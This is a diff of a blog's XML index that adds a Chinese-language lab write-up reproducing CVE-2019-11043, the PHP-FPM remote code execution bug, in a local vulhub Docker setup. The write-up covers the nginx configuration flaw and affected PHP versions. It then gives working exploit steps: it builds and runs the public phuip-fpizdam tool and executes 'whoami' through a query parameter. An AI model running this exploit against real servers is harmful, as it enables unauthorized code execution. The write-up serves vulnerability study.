@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>CVE-2019-11043PHP-FPM远程RCE复现</title>
+      <link href="/2024/04/06/CVE-2019-11043PHP-FPM%E8%BF%9C%E7%A8%8BRCE%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2024/04/06/CVE-2019-11043PHP-FPM%E8%BF%9C%E7%A8%8BRCE%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="使用vulhub搭建环境"><a href="#使用vulhub搭建环境" class="headerlink" title="使用vulhub搭建环境"></a>使用vulhub搭建环境</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure><h1 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h1><p>PHP-FPM(PHP FastCGI Process Manager)意：PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。</p><p>PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><p>CGI（Common Gateway Interface）是一种通用网关接口，是 Web 服务器与外部程序（通常是脚本）之间进行交互的一种标准。它允许 Web 服务器动态生成网页内容，并将内容发送给客户端浏览器。CGI 脚本可以使用各种编程语言编写，如 Perl、Python、PHP、Ruby 等，它们被称为 CGI 脚本语言。这些脚本语言与 Web 服务器之间的交互遵循 CGI 协议的标准，以实现动态生成网页内容的功能</p><p>相较于传统的 CGI，FastCGI 提供了更高的性能和更好的扩展性</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>nginx.conf文件中的配置</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br></pre></td></tr></tbody></table></figure><p><code>fastcgi_split_path_info</code> 函数会根据提供的正则表表达式, 将请求的URL(不包括?之后的参数部分)，分割为两个部分，分别赋值给变量 <code>$fastcgi_script_name</code> 和 <code>$fastcgi_path_info</code> 。</p><p>由于<code>/index.php/test%0atest</code> 无法被正则表达式 <code>^(.+?\.php)(/.*)$</code> 分割为两个部分，所以nginx传给php-fpm的变量中 <code>SCRIPT_NAME</code> 为 <code>/index.php/test\ntest</code> , <code>PATH_INFO</code> 为空</p><p>在index.php后追加一句</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">echo $_SERVER["PATH_INFO"];</span><br></pre></td></tr></tbody></table></figure><p>然后重新构建镜像</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker-compose down</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure><p>访问容器中的8080端口</p><p>访问/index.php/test</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@target www]# curl http://localhost:8080/index.php/test</span><br><span class="line">hello world/test</span><br><span class="line"></span><br><span class="line">[root@target www]# curl http://localhost:8080/index.php/test/%0atest</span><br><span class="line">hello world</span><br></pre></td></tr></tbody></table></figure><p>后面的poc编写涉及到二进制</p><p><a href="https://xz.aliyun.com/t/6672?time__1311=n4+xnD0DRDBGitG8Duexlhje0=ea+x0KeqKpox">https://xz.aliyun.com/t/6672?time__1311=n4%2BxnD0DRDBGitG8Duexlhje0%3Dea%2Bx0KeqKpox</a></p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h1><p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p><ul><li>PHP 7.0 版本</li><li>PHP 7.1 版本</li><li>PHP 7.2 版本</li><li>PHP 7.3 版本</li></ul><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/neex/phuip-fpizdam.git cd phuip-fpizdam go get -v &amp;&amp; go build</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">go run . "http://localhost:8080/index.php"</span><br></pre></td></tr></tbody></table></figure><p>然后可以进行RCE </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl "http://localhost:8080/index.php?a=whoami"</span><br><span class="line">www-data</span><br><span class="line">hello world</span><br></pre></td></tr></tbody></table></figure><p>但是因为只有部分PHP-FPM进程收到污染，所以要多尝试几次curl</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>IceTHM</title>
       <link href="/2024/04/02/IceTHM/"/>
       <url>/2024/04/02/IceTHM/</url>
@@ -80,9 +107,9 @@
             
             <tag> 网安 </tag>
             
-            <tag> 工具 </tag>
-            
             <tag> 笔记 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
@@ -351,9 +378,9 @@
             
             <tag> 网安 </tag>
             
-            <tag> 工具 </tag>
-            
             <tag> 笔记 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
